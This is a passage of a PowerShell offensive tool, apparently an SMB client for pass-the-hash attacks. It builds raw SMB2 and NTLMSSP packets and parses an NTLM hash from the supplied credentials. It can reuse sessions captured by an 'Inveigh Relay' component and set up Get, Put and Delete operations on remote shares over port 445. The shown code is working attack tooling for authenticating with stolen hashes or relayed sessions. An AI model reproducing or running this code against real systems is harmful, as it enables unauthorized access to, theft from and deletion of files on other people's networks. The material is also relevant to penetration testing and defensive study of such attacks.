    $SMB2SessionSetupRequest.Add("SecurityBufferLength",$security_buffer_length)

    $SMB2SessionSetupRequest.Add("PreviousSessionID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    $SMB2SessionSetupRequest.Add("Buffer",$SecurityBlob)

    return $SMB2SessionSetupRequest 

}

function New-PacketSMB2TreeConnectRequest

{

    param([Byte[]]$Buffer)

    [Byte[]]$path_length = ([System.BitConverter]::GetBytes($Buffer.Length))[0,1]

    $SMB2TreeConnectRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $SMB2TreeConnectRequest.Add("StructureSize",[Byte[]](0x09,0x00))

    $SMB2TreeConnectRequest.Add("Reserved",[Byte[]](0x00,0x00))

    $SMB2TreeConnectRequest.Add("PathOffset",[Byte[]](0x48,0x00))

    $SMB2TreeConnectRequest.Add("PathLength",$path_length)

    $SMB2TreeConnectRequest.Add("Buffer",$Buffer)

    return $SMB2TreeConnectRequest

}

function New-PacketSMB2CreateRequest

{

    param([Byte[]]$FileName,[Int]$ExtraInfo,[Int64]$AllocationSize)

    if($FileName)

    {

        $file_name_length = [System.BitConverter]::GetBytes($FileName.Length)[0,1]

    }

    else

    {

        $FileName = 0x00,0x00,0x69,0x00,0x6e,0x00,0x64,0x00

        $file_name_length = 0x00,0x00

    }

    if($ExtraInfo)

    {

        [Byte[]]$desired_access = 0x80,0x00,0x10,0x00

        [Byte[]]$file_attributes = 0x00,0x00,0x00,0x00

        [Byte[]]$share_access = 0x00,0x00,0x00,0x00

        [Byte[]]$create_options = 0x21,0x00,0x00,0x00

        [Byte[]]$create_contexts_offset = [System.BitConverter]::GetBytes($FileName.Length)

        if($ExtraInfo -eq 1)

        {

            [Byte[]]$create_contexts_length = 0x58,0x00,0x00,0x00

        }

        elseif($ExtraInfo -eq 2)

        {

            [Byte[]]$create_contexts_length = 0x90,0x00,0x00,0x00

        }

        else

        {

            [Byte[]]$create_contexts_length = 0xb0,0x00,0x00,0x00

            [Byte[]]$allocation_size_bytes = [System.BitConverter]::GetBytes($AllocationSize)

        }

        if($FileName)

        {

            [String]$file_name_padding_check = $FileName.Length / 8

            if($file_name_padding_check -like "*.75")

            {

                $FileName += 0x04,0x00

            }

            elseif($file_name_padding_check -like "*.5")

            {

                $FileName += 0x00,0x00,0x00,0x00

            }

            elseif($file_name_padding_check -like "*.25")

            {

               $FileName += 0x00,0x00,0x00,0x00,0x00,0x00

            }

        }

        [Byte[]]$create_contexts_offset = [System.BitConverter]::GetBytes($FileName.Length + 120)

    }

    else

    {

        [Byte[]]$desired_access = 0x03,0x00,0x00,0x00

        [Byte[]]$file_attributes = 0x80,0x00,0x00,0x00

        [Byte[]]$share_access = 0x01,0x00,0x00,0x00

        [Byte[]]$create_options = 0x40,0x00,0x00,0x00

        [Byte[]]$create_contexts_offset = 0x00,0x00,0x00,0x00

        [Byte[]]$create_contexts_length = 0x00,0x00,0x00,0x00

    }

    [String]$lease_key = [String](1..16 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})

    [Byte[]]$lease_key = $lease_key.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

    $SMB2CreateRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $SMB2CreateRequest.Add("StructureSize",[Byte[]](0x39,0x00))

    $SMB2CreateRequest.Add("Flags",[Byte[]](0x00))

    $SMB2CreateRequest.Add("RequestedOplockLevel",[Byte[]](0x00))

    $SMB2CreateRequest.Add("Impersonation",[Byte[]](0x02,0x00,0x00,0x00))

    $SMB2CreateRequest.Add("SMBCreateFlags",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    $SMB2CreateRequest.Add("Reserved",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    $SMB2CreateRequest.Add("DesiredAccess",$desired_access)

    $SMB2CreateRequest.Add("FileAttributes",$file_attributes)

    $SMB2CreateRequest.Add("ShareAccess",$share_access)

    $SMB2CreateRequest.Add("CreateDisposition",[Byte[]](0x01,0x00,0x00,0x00))

    $SMB2CreateRequest.Add("CreateOptions",$create_options)

    $SMB2CreateRequest.Add("NameOffset",[Byte[]](0x78,0x00))

    $SMB2CreateRequest.Add("NameLength",$file_name_length)

    $SMB2CreateRequest.Add("CreateContextsOffset",$create_contexts_offset)

    $SMB2CreateRequest.Add("CreateContextsLength",$create_contexts_length)

    $SMB2CreateRequest.Add("Buffer",$FileName)

    if($ExtraInfo)

    {

        $SMB2CreateRequest.Add("ExtraInfo_ChainElementDHnQ_ChainOffset",[Byte[]](0x28,0x00,0x00,0x00))

        $SMB2CreateRequest.Add("ExtraInfo_ChainElementDHnQ_Tag_Offset",[Byte[]](0x10,0x00))

        $SMB2CreateRequest.Add("ExtraInfo_ChainElementDHnQ_Tag_Length",[Byte[]](0x04,0x00,0x00,0x00))

        $SMB2CreateRequest.Add("ExtraInfo_ChainElementDHnQ_Data_Offset",[Byte[]](0x18,0x00))

        $SMB2CreateRequest.Add("ExtraInfo_ChainElementDHnQ_Data_Length",[Byte[]](0x10,0x00,0x00,0x00))

        $SMB2CreateRequest.Add("ExtraInfo_ChainElementDHnQ_Tag",[Byte[]](0x44,0x48,0x6e,0x51))

        $SMB2CreateRequest.Add("ExtraInfo_ChainElementDHnQ_Unknown",[Byte[]](0x00,0x00,0x00,0x00))

        $SMB2CreateRequest.Add("ExtraInfo_ChainElementDHnQ_Data_GUIDHandle",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        if($ExtraInfo -eq 3)

        {

            $SMB2CreateRequest.Add("ExtraInfo_ChainElementAlSi_ChainOffset",[Byte[]](0x20,0x00,0x00,0x00))

            $SMB2CreateRequest.Add("ExtraInfo_ChainElementAlSi_Tag_Offset",[Byte[]](0x10,0x00))

            $SMB2CreateRequest.Add("ExtraInfo_ChainElementAlSi_Tag_Length",[Byte[]](0x04,0x00,0x00,0x00))

            $SMB2CreateRequest.Add("ExtraInfo_ChainElementAlSi_Data_Offset",[Byte[]](0x18,0x00))

            $SMB2CreateRequest.Add("ExtraInfo_ChainElementAlSi_Data_Length",[Byte[]](0x08,0x00,0x00,0x00))

            $SMB2CreateRequest.Add("ExtraInfo_ChainElementAlSi_Tag",[Byte[]](0x41,0x6c,0x53,0x69))

            $SMB2CreateRequest.Add("ExtraInfo_ChainElementAlSi_Unknown",[Byte[]](0x00,0x00,0x00,0x00))

            $SMB2CreateRequest.Add("ExtraInfo_ChainElementAlSi_AllocationSize",$allocation_size_bytes)

        }

        $SMB2CreateRequest.Add("ExtraInfo_ChainElementMxAc_ChainOffset",[Byte[]](0x18,0x00,0x00,0x00))

        $SMB2CreateRequest.Add("ExtraInfo_ChainElementMxAc_Tag_Offset",[Byte[]](0x10,0x00))

        $SMB2CreateRequest.Add("ExtraInfo_ChainElementMxAc_Tag_Length",[Byte[]](0x04,0x00,0x00,0x00))

        $SMB2CreateRequest.Add("ExtraInfo_ChainElementMxAc_Data_Offset",[Byte[]](0x18,0x00))

        $SMB2CreateRequest.Add("ExtraInfo_ChainElementMxAc_Data_Length",[Byte[]](0x00,0x00,0x00,0x00))

        $SMB2CreateRequest.Add("ExtraInfo_ChainElementMxAc_Tag",[Byte[]](0x4d,0x78,0x41,0x63))

        $SMB2CreateRequest.Add("ExtraInfo_ChainElementMxAc_Unknown",[Byte[]](0x00,0x00,0x00,0x00))

        if($ExtraInfo -gt 1)

        {

            $SMB2CreateRequest.Add("ExtraInfo_ChainElementQFid_ChainOffset",[Byte[]](0x18,0x00,0x00,0x00))

        }

        else

        {

            $SMB2CreateRequest.Add("ExtraInfo_ChainElementQFid_ChainOffset",[Byte[]](0x00,0x00,0x00,0x00))

        }

        $SMB2CreateRequest.Add("ExtraInfo_ChainElementQFid_Tag_Offset",[Byte[]](0x10,0x00))

        $SMB2CreateRequest.Add("ExtraInfo_ChainElementQFid_Tag_Length",[Byte[]](0x04,0x00,0x00,0x00))

        $SMB2CreateRequest.Add("ExtraInfo_ChainElementQFid_Data_Offset",[Byte[]](0x18,0x00))

        $SMB2CreateRequest.Add("ExtraInfo_ChainElementQFid_Data_Length",[Byte[]](0x00,0x00,0x00,0x00))

        $SMB2CreateRequest.Add("ExtraInfo_ChainElementQFid_Tag",[Byte[]](0x51,0x46,0x69,0x64))

        $SMB2CreateRequest.Add("ExtraInfo_ChainElementQFid_Unknown",[Byte[]](0x00,0x00,0x00,0x00))

        if($ExtraInfo -gt 1)

        {

            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_ChainOffset",[Byte[]](0x00,0x00,0x00,0x00))

            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Tag_Offset",[Byte[]](0x10,0x00))

            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Tag_Length",[Byte[]](0x04,0x00,0x00,0x00))

            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Data_Offset",[Byte[]](0x18,0x00))

            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Data_Length",[Byte[]](0x20,0x00,0x00,0x00))

            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Tag",[Byte[]](0x52,0x71,0x4c,0x73))

            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Unknown",[Byte[]](0x00,0x00,0x00,0x00))

            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Data_Lease_Key",$lease_key)

            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Data_Lease_State",[Byte[]](0x07,0x00,0x00,0x00))

            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Data_Lease_Flags",[Byte[]](0x00,0x00,0x00,0x00))

            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Data_Lease_Duration",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        }

    }

    return $SMB2CreateRequest

}

function New-PacketSMB2FindRequestFile

{

    param ([Byte[]]$FileID,[Byte[]]$Padding)

    $SMB2FindRequestFile = New-Object System.Collections.Specialized.OrderedDictionary

    $SMB2FindRequestFile.Add("SMB2FindRequestFile_StructureSize",[Byte[]](0x21,0x00))

    $SMB2FindRequestFile.Add("SMB2FindRequestFile_InfoLevel",[Byte[]](0x25))

    $SMB2FindRequestFile.Add("SMB2FindRequestFile_Flags",[Byte[]](0x00))

    $SMB2FindRequestFile.Add("SMB2FindRequestFile_FileIndex",[Byte[]](0x00,0x00,0x00,0x00))

    $SMB2FindRequestFile.Add("SMB2FindRequestFile_FileID",$FileID)

    $SMB2FindRequestFile.Add("SMB2FindRequestFile_SearchPattern_Offset",[Byte[]](0x60,0x00))

    $SMB2FindRequestFile.Add("SMB2FindRequestFile_SearchPattern_Length",[Byte[]](0x02,0x00))

    $SMB2FindRequestFile.Add("SMB2FindRequestFile_OutputBufferLength",[Byte[]](0x00,0x00,0x01,0x00))

    $SMB2FindRequestFile.Add("SMB2FindRequestFile_SearchPattern",[Byte[]](0x2a,0x00))

    if($padding)

    {

        $SMB2FindRequestFile.Add("SMB2FindRequestFile_Padding",$Padding)

    }

    return $SMB2FindRequestFile

}

function New-PacketSMB2QueryInfoRequest

{

    param ([Byte[]]$InfoType,[Byte[]]$FileInfoClass,[Byte[]]$OutputBufferLength,[Byte[]]$InputBufferOffset,[Byte[]]$FileID,[Int]$Buffer)

    [Byte[]]$buffer_bytes = ,0x00 * $Buffer

    $SMB2QueryInfoRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $SMB2QueryInfoRequest.Add("StructureSize",[Byte[]](0x29,0x00))

    $SMB2QueryInfoRequest.Add("InfoType",$InfoType)

    $SMB2QueryInfoRequest.Add("FileInfoClass",$FileInfoClass)

    $SMB2QueryInfoRequest.Add("OutputBufferLength",$OutputBufferLength)

    $SMB2QueryInfoRequest.Add("InputBufferOffset",$InputBufferOffset)

    $SMB2QueryInfoRequest.Add("Reserved",[Byte[]](0x00,0x00))

    $SMB2QueryInfoRequest.Add("InputBufferLength",[Byte[]](0x00,0x00,0x00,0x00))

    $SMB2QueryInfoRequest.Add("AdditionalInformation",[Byte[]](0x00,0x00,0x00,0x00))

    $SMB2QueryInfoRequest.Add("Flags",[Byte[]](0x00,0x00,0x00,0x00))

    $SMB2QueryInfoRequest.Add("FileID",$FileID)

    if($Buffer -gt 0)

    {

        $SMB2QueryInfoRequest.Add("Buffer",$buffer_bytes)

    }

    return $SMB2QueryInfoRequest

}

function New-PacketSMB2ReadRequest

{

    param ([Int]$Length,[Int64]$Offset,[Byte[]]$FileID)

    [Byte[]]$length_bytes = [System.BitConverter]::GetBytes($Length)

    [Byte[]]$offset_bytes = [System.BitConverter]::GetBytes($Offset)

    $SMB2ReadRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $SMB2ReadRequest.Add("StructureSize",[Byte[]](0x31,0x00))

    $SMB2ReadRequest.Add("Padding",[Byte[]](0x50))

    $SMB2ReadRequest.Add("Flags",[Byte[]](0x00))

    $SMB2ReadRequest.Add("Length",$length_bytes)

    $SMB2ReadRequest.Add("Offset",$offset_bytes)

    $SMB2ReadRequest.Add("FileID",$FileID)

    $SMB2ReadRequest.Add("MinimumCount",[Byte[]](0x00,0x00,0x00,0x00))

    $SMB2ReadRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))

    $SMB2ReadRequest.Add("RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))

    $SMB2ReadRequest.Add("ReadChannelInfoOffset",[Byte[]](0x00,0x00))

    $SMB2ReadRequest.Add("ReadChannelInfoLength",[Byte[]](0x00,0x00))

    $SMB2ReadRequest.Add("Buffer",[Byte[]](0x30))

    return $SMB2ReadRequest

}

function New-PacketSMB2WriteRequest

{

    param([Int]$Length,[Int64]$Offset,[Byte[]]$FileID,[Byte[]]$Buffer)

    [Byte[]]$length_bytes = [System.BitConverter]::GetBytes($Length)

    [Byte[]]$offset_bytes = [System.BitConverter]::GetBytes($Offset)

    $SMB2WriteRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $SMB2WriteRequest.Add("StructureSize",[Byte[]](0x31,0x00))

    $SMB2WriteRequest.Add("DataOffset",[Byte[]](0x70,0x00))

    $SMB2WriteRequest.Add("Length",$length_bytes)

    $SMB2WriteRequest.Add("Offset",$offset_bytes)

    $SMB2WriteRequest.Add("FileID",$FileID)

    $SMB2WriteRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))

    $SMB2WriteRequest.Add("RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))

    $SMB2WriteRequest.Add("WriteChannelInfoOffset",[Byte[]](0x00,0x00))

    $SMB2WriteRequest.Add("WriteChannelInfoLength",[Byte[]](0x00,0x00))

    $SMB2WriteRequest.Add("Flags",[Byte[]](0x00,0x00,0x00,0x00))

    $SMB2WriteRequest.Add("SMB2WriteRequest_Buffer",$Buffer)

    return $SMB2WriteRequest

}

function New-PacketSMB2CloseRequest

{

    param ([Byte[]]$FileID)

    $SMB2CloseRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $SMB2CloseRequest.Add("StructureSize",[Byte[]](0x18,0x00))

    $SMB2CloseRequest.Add("Flags",[Byte[]](0x00,0x00))

    $SMB2CloseRequest.Add("Reserved",[Byte[]](0x00,0x00,0x00,0x00))

    $SMB2CloseRequest.Add("FileID",$FileID)

    return $SMB2CloseRequest

}

function New-PacketSMB2TreeDisconnectRequest

{

    $SMB2TreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $SMB2TreeDisconnectRequest.Add("StructureSize",[Byte[]](0x04,0x00))

    $SMB2TreeDisconnectRequest.Add("Reserved",[Byte[]](0x00,0x00))

    return $SMB2TreeDisconnectRequest

}

function New-PacketSMB2SessionLogoffRequest

{

    $SMB2SessionLogoffRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $SMB2SessionLogoffRequest.Add("StructureSize",[Byte[]](0x04,0x00))

    $SMB2SessionLogoffRequest.Add("Reserved",[Byte[]](0x00,0x00))

    return $SMB2SessionLogoffRequest

}

function New-PacketSMB2IoctlRequest()

{

    param([Byte[]]$FileName)

    $file_name_length = [System.BitConverter]::GetBytes($FileName.Length + 2)

    $packet_SMB2IoctlRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $packet_SMB2IoctlRequest.Add("StructureSize",[Byte[]](0x39,0x00))

    $packet_SMB2IoctlRequest.Add("Reserved",[Byte[]](0x00,0x00))

    $packet_SMB2IoctlRequest.Add("Function",[Byte[]](0x94,0x01,0x06,0x00))

    $packet_SMB2IoctlRequest.Add("GUIDHandle",[Byte[]](0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff))

    $packet_SMB2IoctlRequest.Add("InData_Offset",[Byte[]](0x78,0x00,0x00,0x00))

    $packet_SMB2IoctlRequest.Add("InData_Length",$file_name_length)

    $packet_SMB2IoctlRequest.Add("MaxIoctlInSize",[Byte[]](0x00,0x00,0x00,0x00))

    $packet_SMB2IoctlRequest.Add("OutData_Offset",[Byte[]](0x78,0x00,0x00,0x00))

    $packet_SMB2IoctlRequest.Add("OutData_Length",[Byte[]](0x00,0x00,0x00,0x00))

    $packet_SMB2IoctlRequest.Add("MaxIoctlOutSize",[Byte[]](0x00,0x10,0x00,0x00))

    $packet_SMB2IoctlRequest.Add("Flags",[Byte[]](0x01,0x00,0x00,0x00))

    $packet_SMB2IoctlRequest.Add("Unknown",[Byte[]](0x00,0x00,0x00,0x00))

    $packet_SMB2IoctlRequest.Add("InData_MaxReferralLevel",[Byte[]](0x04,0x00))

    $packet_SMB2IoctlRequest.Add("InData_FileName",$FileName)

    return $packet_SMB2IoctlRequest

}

function New-PacketSMB2SetInfoRequest

{

    param ([Byte[]]$InfoType,[Byte[]]$FileInfoClass,[Byte[]]$FileID,[Byte[]]$Buffer)

    [Byte[]]$buffer_length = [System.BitConverter]::GetBytes($Buffer.Count)

    $SMB2SetInfoRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $SMB2SetInfoRequest.Add("StructureSize",[Byte[]](0x21,0x00))

    $SMB2SetInfoRequest.Add("InfoType",$InfoType)

    $SMB2SetInfoRequest.Add("FileInfoClass",$FileInfoClass)

    $SMB2SetInfoRequest.Add("BufferLength",$buffer_length)

    $SMB2SetInfoRequest.Add("BufferOffset",[Byte[]](0x60,0x00))

    $SMB2SetInfoRequest.Add("Reserved",[Byte[]](0x00,0x00))

    $SMB2SetInfoRequest.Add("AdditionalInformation",[Byte[]](0x00,0x00,0x00,0x00))

    $SMB2SetInfoRequest.Add("FileID",$FileID)

    $SMB2SetInfoRequest.Add("Buffer",$Buffer)

    return $SMB2SetInfoRequest

}

#NTLM

function New-PacketNTLMSSPNegotiate

{

    param([Byte[]]$NegotiateFlags,[Byte[]]$Version)

    [Byte[]]$NTLMSSP_length = ([System.BitConverter]::GetBytes($Version.Length + 32))[0]

    [Byte[]]$ASN_length_1 = $NTLMSSP_length[0] + 32

    [Byte[]]$ASN_length_2 = $NTLMSSP_length[0] + 22

    [Byte[]]$ASN_length_3 = $NTLMSSP_length[0] + 20

    [Byte[]]$ASN_length_4 = $NTLMSSP_length[0] + 2

    $NTLMSSPNegotiate = New-Object System.Collections.Specialized.OrderedDictionary

    $NTLMSSPNegotiate.Add("InitialContextTokenID",[Byte[]](0x60))

    $NTLMSSPNegotiate.Add("InitialcontextTokenLength",$ASN_length_1)

    $NTLMSSPNegotiate.Add("ThisMechID",[Byte[]](0x06))

    $NTLMSSPNegotiate.Add("ThisMechLength",[Byte[]](0x06))

    $NTLMSSPNegotiate.Add("OID",[Byte[]](0x2b,0x06,0x01,0x05,0x05,0x02))

    $NTLMSSPNegotiate.Add("InnerContextTokenID",[Byte[]](0xa0))

    $NTLMSSPNegotiate.Add("InnerContextTokenLength",$ASN_length_2)

    $NTLMSSPNegotiate.Add("InnerContextTokenID2",[Byte[]](0x30))

    $NTLMSSPNegotiate.Add("InnerContextTokenLength2",$ASN_length_3)

    $NTLMSSPNegotiate.Add("MechTypesID",[Byte[]](0xa0))

    $NTLMSSPNegotiate.Add("MechTypesLength",[Byte[]](0x0e))

    $NTLMSSPNegotiate.Add("MechTypesID2",[Byte[]](0x30))

    $NTLMSSPNegotiate.Add("MechTypesLength2",[Byte[]](0x0c))

    $NTLMSSPNegotiate.Add("MechTypesID3",[Byte[]](0x06))

    $NTLMSSPNegotiate.Add("MechTypesLength3",[Byte[]](0x0a))

    $NTLMSSPNegotiate.Add("MechType",[Byte[]](0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a))

    $NTLMSSPNegotiate.Add("MechTokenID",[Byte[]](0xa2))

    $NTLMSSPNegotiate.Add("MechTokenLength",$ASN_length_4)

    $NTLMSSPNegotiate.Add("NTLMSSPID",[Byte[]](0x04))

    $NTLMSSPNegotiate.Add("NTLMSSPLength",$NTLMSSP_length)

    $NTLMSSPNegotiate.Add("Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))

    $NTLMSSPNegotiate.Add("MessageType",[Byte[]](0x01,0x00,0x00,0x00))

    $NTLMSSPNegotiate.Add("NegotiateFlags",$NegotiateFlags)

    $NTLMSSPNegotiate.Add("CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    $NTLMSSPNegotiate.Add("CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    if($Version)

    {

        $NTLMSSPNegotiate.Add("Version",$Version)

    }

    return $NTLMSSPNegotiate

}

function New-PacketNTLMSSPAuth

{

    param([Byte[]]$NTLMResponse)

    [Byte[]]$NTLMSSP_length = ([System.BitConverter]::GetBytes($NTLMResponse.Length))[1,0]

    [Byte[]]$ASN_length_1 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 12))[1,0]

    [Byte[]]$ASN_length_2 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 8))[1,0]

    [Byte[]]$ASN_length_3 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 4))[1,0]

    $NTLMSSPAuth = New-Object System.Collections.Specialized.OrderedDictionary

    $NTLMSSPAuth.Add("ASNID",[Byte[]](0xa1,0x82))

    $NTLMSSPAuth.Add("ASNLength",$ASN_length_1)

    $NTLMSSPAuth.Add("ASNID2",[Byte[]](0x30,0x82))

    $NTLMSSPAuth.Add("ASNLength2",$ASN_length_2)

    $NTLMSSPAuth.Add("ASNID3",[Byte[]](0xa2,0x82))

    $NTLMSSPAuth.Add("ASNLength3",$ASN_length_3)

    $NTLMSSPAuth.Add("NTLMSSPID",[Byte[]](0x04,0x82))

    $NTLMSSPAuth.Add("NTLMSSPLength",$NTLMSSP_length)

    $NTLMSSPAuth.Add("NTLMResponse",$NTLMResponse)

    return $NTLMSSPAuth

}

function Get-UInt16DataLength

{

    param ([Int]$Start,[Byte[]]$Data)

    $data_length = [System.BitConverter]::ToUInt16($Data[$Start..($Start + 1)],0)

    return $data_length

}

if($Modify -and $Action -eq 'Put' -and $Source -isnot [Byte[]])

{

    $output_message = "[-] Source must be a byte array when using -Modify"

    $startup_error = $true

}

elseif((!$Modify -and $Source -isnot [String]) -or ($Modify -and $Action -ne 'Put' -and $Source -isnot [String]))

{

    $output_message = "[-] Source must be a string"

    $startup_error = $true

}

elseif($Action -eq 'Delete' -and !$Source.StartsWith("\\"))

{

    $output_message = "[-] Source must be a UNC file path"

    $startup_error = $true

}

elseif($Source -is [String])

{

    $source = $Source.Replace('.\','')

}

if($PSBoundParameters.ContainsKey('Session'))

{

    $inveigh_session = $true

}

if($PSBoundParameters.ContainsKey('Session'))

{

    if(!$Inveigh)

    {

        Write-Output "[-] Inveigh Relay session not found"

        $startup_error = $true

    }

    elseif(!$inveigh.session_socket_table[$session].Connected)

    {

        Write-Output "[-] Inveigh Relay session not connected"

        $startup_error = $true

    }

}

$destination = $Destination.Replace('.\','')

if($hash -like "*:*")

{

    $hash = $hash.SubString(($hash.IndexOf(":") + 1),32)

}

if($Domain)

{

    $output_username = $Domain + "\" + $Username

}

else

{

    $output_username = $Username

}

$process_ID = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -expand id

$process_ID = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($process_ID))

[Byte[]]$process_ID = $process_ID.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

if(!$inveigh_session)

{

    $client = New-Object System.Net.Sockets.TCPClient

    $client.Client.ReceiveTimeout = 30000

}

$action_step = 0

if($Action -ne 'Put')

{

    $source = $source.Replace('\\','')

    $source_array = $source.Split('\')

    $target = $source_array[0]

    $share = $source_array[1]

    $source_subdirectory_array = $source.ToCharArray()

    [Array]::Reverse($source_subdirectory_array)

    $source_file = -join($source_subdirectory_array)

    $source_file = $source_file.SubString(0,$source_file.IndexOf('\'))

    $source_file_array = $source_file.ToCharArray()

    [Array]::Reverse($source_file_array)

    $source_file = -join($source_file_array)

    $target_share = "\\$target\$share"

}

switch($Action)

{

    'Get'

    {

        if(!$Modify)

        {

            if($destination -and $destination -like '*\*')

            {

                $destination_file_array = $destination.ToCharArray()

                [Array]::Reverse($destination_file_array)

                $destination_file = -join($destination_file_array)

                $destination_file = $destination_file.SubString(0,$destination_file.IndexOf('\'))

                $destination_file_array = $destination_file.ToCharArray()

                [Array]::Reverse($destination_file_array)

                $destination_file = -join($destination_file_array)

                $destination_path = $destination

            }

            elseif($destination)

            {

                if(Test-Path (Join-Path $PWD $destination))

                {

                    $output_message = "[-] Destination file already exists"

                    $startup_error = $true

                }

                else

                {

                    $destination_path = Join-Path $PWD $destination

                }

            }

            else

            {

                if(Test-Path (Join-Path $PWD $source_file))

                {

                    $output_message = "[-] Destination file already exists"

                    $startup_error = $true

                }

                else

                {

                    $destination_path = Join-Path $PWD $source_file

                }

            }

        }

        else

        {

            $file_memory = New-Object System.Collections.ArrayList

        }

    }

    'Put'

    {

        if(!$Modify)

        {

            if($source -notlike '*\*')

            {

                $source = Join-Path $PWD $source

            }

            if(Test-Path $source)

            {

                [Int64]$source_file_size = (Get-Item $source).Length

                $source_file = $source

                if($source_file_size -gt 65536)

                {

                    $source_file_size_quotient = [Math]::Truncate($source_file_size / 65536)

                    $source_file_size_remainder = $source_file_size % 65536

                    $source_file_buffer_size = 65536

                }

                else

                {

                    $source_file_buffer_size = $source_file_size

                }

                $source_file_properties = Get-ItemProperty -path $source_file

                $source_file_creation_time = $source_file_properties.CreationTime.ToFileTime()

                $source_file_creation_time = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($source_file_creation_time))

                $source_file_creation_time = $source_file_creation_time.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

                $source_file_last_access_time = $source_file_properties.LastAccessTime.ToFileTime()

                $source_file_last_access_time = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($source_file_last_access_time))

                $source_file_last_access_time = $source_file_last_access_time.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

                $source_file_last_write_time = $source_file_properties.LastWriteTime.ToFileTime()

                $source_file_last_write_time = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($source_file_last_write_time))

                $source_file_last_write_time = $source_file_last_write_time.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

                $source_file_last_change_time = $source_file_last_write_time

                $source_file_buffer = new-object byte[] $source_file_buffer_size

                $source_file_stream = new-object IO.FileStream($source_file,[System.IO.FileMode]::Open)

                $source_file_binary_reader = new-object IO.BinaryReader($source_file_stream)

            }

            else

            {

                $output_message = "[-] File not found"

                $startup_error = $true

            }

        }

        else

        {

            [Int64]$source_file_size = $Source.Count

            if($source_file_size -gt 65536)

            {

                $source_file_size_quotient = [Math]::Truncate($source_file_size / 65536)

                $source_file_size_remainder = $source_file_size % 65536

                $source_file_buffer_size = 65536

            }

            else

            {

                $source_file_buffer_size = $source_file_size

            }

        }

        $destination = $destination.Replace('\\','')

        $destination_array = $destination.Split('\')

        $target = $destination_array[0]

        $share = $destination_array[1]

        $destination_file_array = $destination.ToCharArray()

        [Array]::Reverse($destination_file_array)

        $destination_file = -join($destination_file_array)

        $destination_file = $destination_file.SubString(0,$destination_file.IndexOf('\'))

        $destination_file_array = $destination_file.ToCharArray()

        [Array]::Reverse($destination_file_array)

        $destination_file = -join($destination_file_array)

    }

}

if($Action -ne 'Put')

{

    if($source_array.Count -gt 2)

    {

        $share_subdirectory = $source.Substring($target.Length + $share.Length + 2)

    }

}

else

{

    if($destination_array.Count -gt 2)

    {

        $share_subdirectory = $destination.Substring($target.Length + $share.Length + 2)

    }

}

if($share_subdirectory -and $share_subdirectory.EndsWith('\'))

{

    $share_subdirectory = $share_subdirectory.Substring(0,$share_subdirectory.Length - 1)

}

if(!$startup_error -and !$inveigh_session)

{

    try

    {

        $client.Connect($target,"445")

    }

    catch

    {

        $output_message = "[-] $target did not respond"

    }

}

if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$session].Connected))

{

    $client_receive = New-Object System.Byte[] 81920

    if(!$inveigh_session)

    {

        $client_stream = $client.GetStream()

        if($SMB_version -eq 'SMB2.1')

        {

            $stage = 'NegotiateSMB2'

        }

        else

        {

            $stage = 'NegotiateSMB'

        }

        while($stage -ne 'Exit')

        {

            try

            {

                switch ($stage)

                {

                    'NegotiateSMB'

                    {          

                        $packet_SMB_header = New-PacketSMBHeader 0x72 0x18 0x01,0x48 0xff,0xff $process_ID 0x00,0x00       

                        $packet_SMB_data = New-PacketSMBNegotiateProtocolRequest $SMB_version

